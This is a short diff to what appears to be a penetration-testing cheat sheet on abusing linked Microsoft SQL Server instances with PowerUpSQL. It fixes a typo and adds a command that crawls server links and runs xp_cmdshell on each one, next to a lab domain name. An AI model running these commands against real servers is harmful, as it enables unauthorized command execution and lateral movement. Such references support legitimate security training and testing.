@@ -592,9 +592,10 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
 Get-SQLServerLinkCrawl -Instance UFC-SQLDev.us.funcorp.local | Where-Object -Property sysadmin -Match 1
 ```
 
-#### Crawl and try to use xp_cmdshell on every linke
+#### Crawl and try to use xp_cmdshell on every link
 ```
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
 ```
 
 #### Enable xp_cmdshell
